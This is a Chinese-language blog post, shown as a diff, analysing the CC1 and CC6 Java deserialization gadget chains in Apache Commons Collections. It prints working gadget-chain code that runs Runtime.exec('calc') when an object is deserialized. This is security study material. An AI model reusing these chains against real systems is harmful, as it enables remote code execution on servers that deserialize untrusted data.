@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Java反序列化-(CC1&amp;CC6)LazyMap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化-(CC1&amp;CC6)">
+<meta property="og:url" content="https://apsry.github.io/2022/03/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(CC1&CC6)%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="Java反序列化-(CC1&amp;CC6)LazyMap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282048242.jpg">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282141185.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282114412.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282115144.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282115164.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282122676.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282123614.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282123361.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282129585.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282129877.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282132104.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282144953.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282145364.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282147214.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282155806.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282155221.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282158093.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282202643.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282209402.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282231810.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282232396.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282240495.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282243000.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282048242.jpg">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282247823.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282340342.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282251316.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282252696.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282252236.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282254737.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282309917.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282310424.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282311584.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282316440.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282323612.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282327907.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282328074.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282335151.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282335687.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282337238.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282337861.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282339270.png">
+<meta property="article:published_time" content="2022-03-28T01:26:00.000Z">
+<meta property="article:modified_time" content="2022-03-28T15:46:13.907Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="java代码审计">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282048242.jpg">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(CC1&CC6)%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Java反序列化-(CC1&CC6) | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(CC1&CC6)%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java反序列化-(CC1&CC6)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-28 09:26:00 / 修改时间：23:46:13" itemprop="dateCreated datePublished" datetime="2022-03-28T09:26:00+08:00">2022-03-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Java反序列化-(CC1&amp;CC6)LazyMap</p>
+<span id="more"></span>
+
+
+
+<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>JDK版本：1.7  （8u71之后已修复不可利用）</p>
+<p>单独下载jre的网址</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.azul.com/zulu/bin/">https://cdn.azul.com/zulu/bin/</a></p>
+<p>见上篇文章</p>
+<p>镇楼图：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282048242.jpg" alt="CC"></p>
+<p><strong>ysoserial 里的链子</strong></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282141185.png" alt="image-20220328214133139"></p>
+<h2 id="分析复现"><a href="#分析复现" class="headerlink" title="分析复现"></a>分析复现</h2><h3 id="ChainedTransformer-transformer"><a href="#ChainedTransformer-transformer" class="headerlink" title="ChainedTransformer.transformer"></a>ChainedTransformer.transformer</h3><p>直接接前面的，找transformer</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282114412.png" alt="image-20220328211433357"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282115144.png" alt="image-20220328211501084"></p>
+<p>我们第一条链子用的是<code>TransformedMap</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282115164.png" alt="image-20220328211545053"></p>
+<h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get"></a>LazyMap.get</h3><p>CC6用的是<code>LazyMap</code>的get方法</p>
+<p>我们跟到<code>Lazymap</code>的get方法</p>
+<p>可以看到调了<code>factory.transform</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282122676.png" alt="image-20220328212235617"></p>
+<p>我们看<code>factory</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282123614.png" alt="image-20220328212326561"></p>
+<p><strong>factory.transform</strong></p>
+<p>是一个<code>Transformer</code>，也就是过if语句，然后factory是一个Transformer,if语句里面就是map.containsKey没有key即可过if</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282123361.png" alt="image-20220328212349320"></p>
+<h3 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke"></a>AnnotationInvocationHandler.invoke</h3><p>这个时候我们找谁调用了get方法,我们直接找到</p>
+<p><code>AnnotationInvocationHandler</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282129585.png" alt="image-20220328212957532"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282129877.png" alt="image-20220328212943829"></p>
+<p>我们找能控制利用get方法的</p>
+<p>invoke的调用是只要外面有方法调用就会调用invoke</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282132104.png" alt="image-20220328213252045"></p>
+<p>动态代理的处理器类<code>AnnotationInvocationHandler</code>，利用动态代理调用方法就会走到invoke，然后再传,最好就是这样</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282144953.png" alt="image-20220328214404886"></p>
+<p>看get前面的if语句</p>
+<p>不能调有参方法，不能调<code>equals</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282145364.png" alt="image-20220328214522301"></p>
+<p>所有要调<code>memberValues</code>的无参方法，我们找到了这里</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282147214.png" alt="image-20220328214754160"></p>
+<p>然后我们开始写链子</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282155806.png" alt="image-20220328215515732"></p>
+<p>根据需要传参</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282155221.png" alt="image-20220328215537175"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object ,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstrutor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstrutor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstrutor.newInstance(Override.class,lazyMap);</span><br></pre></td></tr></table></figure>
+
+<p>然后下一步就是动态代理，调用invoke</p>
+<p>这个时候我们的注解就可以不是特定的注解了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282158093.png" alt="image-20220328215846034"></p>
+<p>因为我们不用走进if语句，只需要不抛出异常即可</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282202643.png" alt="image-20220328220227589"></p>
+<p>再写动态代理调用</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map mapProxy = (Map) <span class="module-access"><span class="module"><span class="identifier">Proxy</span>.</span></span><span class="keyword">new</span><span class="constructor">ProxyInstance(LazyMap.<span class="params">class</span>.<span class="params">getClassLoader</span>()</span>,<span class="keyword">new</span> Class<span class="literal">[]</span>&#123;<span class="module-access"><span class="module"><span class="identifier">Map</span>.</span></span><span class="keyword">class</span>&#125;,h);</span><br></pre></td></tr></table></figure>
+
+<p>因为接受的是一个Map，所有代理Map</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282209402.png" alt="image-20220328220909341"></p>
+<p>最后到了最外层<code>annotationInvocationHandler</code></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object o =  annotationInvocationHandlerConstrutor.<span class="keyword">new</span><span class="constructor">Instance(Override.<span class="params">class</span>,<span class="params">mapProxy</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>可以看到执行命令了</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282231810.png" alt="image-20220328223136675"></p>
+<p>注意版本问题</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282232396.png" alt="image-20220328223207344"></p>
+<p>8u71以后对类进行了处理</p>
+<p>高版本对Values进行了一个处理</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282240495.png" alt="image-20220328224046434"></p>
+<p>CC0也是对checkValue去掉做了一个put处理</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282243000.png" alt="image-20220328224344922"></p>
+<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>不限制jdk版本，和CC版本</p>
+<p>镇楼图：</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282048242.jpg" alt="CC"></p>
+<p><strong>ysoserial 里的链子</strong></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282247823.png" alt="image-20220328224723762"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282340342.png" alt="image-20220328234022243"></p>
+<h2 id="分析复现-1"><a href="#分析复现-1" class="headerlink" title="分析复现"></a>分析复现</h2><h3 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode"></a>TiedMapEntry.hashCode</h3><p>最后执行代码部分还是和CC1一样，区别就是在get同方法这里，CC6找的是<code>TiedMapEntry.hashCode</code></p>
+<p>我们可以分析下</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282251316.png" alt="image-20220328225145248"></p>
+<p>直接到<code>hashCode</code>里面有<code>getValue</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282252696.png" alt="image-20220328225212640"></p>
+<p>可以看到有get方法</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282252236.png" alt="image-20220328225236178"></p>
+<p>前面都是一样的</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer<span class="literal">[]</span> transformers = <span class="keyword">new</span> Transformer<span class="literal">[]</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">ConstantTransformer(Runtime.<span class="params">class</span>)</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="params">new</span> Class[]&#123;String.<span class="params">class</span>,Class[].<span class="params">class</span>&#125;,<span class="params">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="params">null</span>&#125;)</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="params">new</span> Class[]&#123;Object.<span class="params">class</span>,Object[].<span class="params">class</span>&#125;,<span class="params">new</span> Object[]&#123;<span class="params">null</span>,<span class="params">null</span>&#125;)</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="params">new</span> Class[]&#123;String.<span class="params">class</span>&#125;,<span class="params">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> <span class="constructor">ChainedTransformer(<span class="params">transformers</span>)</span>;</span><br><span class="line">HashMap&lt;Object ,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = <span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>decorate(map,chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<p>我们看<code>TiedMapEntry</code>的构造函数，一个map和一个key</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282254737.png" alt="image-20220328225400696"></p>
+<p>也即构造一个</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="constructor">TiedMapEntry(<span class="params">lazyMap</span>,<span class="string">&quot;aaa&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="hashmap-readObject"><a href="#hashmap-readObject" class="headerlink" title="hashmap.readObject"></a>hashmap.readObject</h3><p>然后我们是想到<code>hashmap</code>的<code>readObject</code>这里来，也即</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282309917.png" alt="image-20220328230950862"></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282310424.png" alt="image-20220328231055330"></p>
+<p>最终是到了一个同名函数<code>hashCode</code></p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282311584.png" alt="image-20220328231120508"></p>
+<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new </span><span class="class title_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new </span><span class="class title_">ConstantTransformer</span>(Runtime.<span class="property">class</span>),</span><br><span class="line">        <span class="keyword">new </span><span class="class title_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new </span><span class="class title_">Class</span>[]&#123;<span class="built_in">String</span>.<span class="property">class</span>,Class[].<span class="property">class</span>&#125;,<span class="keyword">new </span><span class="class title_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new </span><span class="class title_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new </span><span class="class title_">Class</span>[]&#123;<span class="built_in">Object</span>.<span class="property">class</span>,<span class="built_in">Object</span>[].<span class="property">class</span>&#125;,<span class="keyword">new </span><span class="class title_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new </span><span class="class title_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new </span><span class="class title_">Class</span>[]&#123;<span class="built_in">String</span>.<span class="property">class</span>&#125;,<span class="keyword">new </span><span class="class title_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new </span><span class="class title_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="built_in">HashMap</span>&lt;<span class="built_in">Object</span> ,<span class="built_in">Object</span>&gt; <span class="built_in">map</span> = <span class="keyword">new </span><span class="class title_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;<span class="built_in">Object</span>,<span class="built_in">Object</span>&gt; lazyMap = LazyMap.<span class="property">decorate</span>(<span class="built_in">map</span>,chainedTransformer);</span><br><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new </span><span class="class title_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="built_in">HashMap</span>&lt;<span class="built_in">Object</span>,<span class="built_in">Object</span>&gt; map2 = <span class="keyword">new </span><span class="class title_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.<span class="property">put</span>(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"><span class="title function_">serialize</span>(map2);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203282316440.png" alt="image-20220328231641296"></p>
+<p>发现序列化也会执行，原理和urldns类似，需要反射修改，也即put的时候不能触发hash</p>
+<p>我们改下代码，让他开始调用一个无用的<code>new ConstantTransformer(1)</code>，不去触发，然后反序列化的时候再去修改为<code>chainedTransformer</code>触发。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Transformer<span class="literal">[]</span> transformers = <span class="keyword">new</span> Transformer<span class="literal">[]</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">ConstantTransformer(Runtime.<span class="params">class</span>)</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="params">new</span> Class[]&#123;String.<span class="params">class</span>,Class[].<span class="params">class</span>&#125;,<span class="params">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="params">null</span>&#125;)</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="params">new</span> Class[]&#123;Object.<span class="params">class</span>,Object[].<span class="params">class</span>&#125;,<span class="params">new</span> Object[]&#123;<span class="params">null</span>,<span class="params">null</span>&#125;)</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="constructor">InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="params">new</span> Class[]&#123;String.<span class="params">class</span>&#125;,<span class="params">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> <span class="constructor">ChainedTransformer(<span class="params">transformers</span>)</span>;</span><br><span class="line">HashMap&lt;Object ,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = <span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>decorate(map,<span class="keyword">new</span> <span class="constructor">ConstantTransformer(1)</span>);</span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="constructor">TiedMapEntry(<span class="params">lazyMap</span>,<span class="string">&quot;aaa&quot;</span>)</span>;</span><br><span class="line">HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">Class c = <span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span><span class="keyword">class</span>;</span><br><span class="line">Field factoryField =c.get<span class="constructor">DeclaredField(<span class="string">&quot;factory&quot;</span>)</span>;</span><br><span class="line">factoryField.set<span class="constructor">Accessible(<span class="params">true</span>)</span>;</span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">serialize(map2);</span><br></pre></td></tr></table></figure>
+
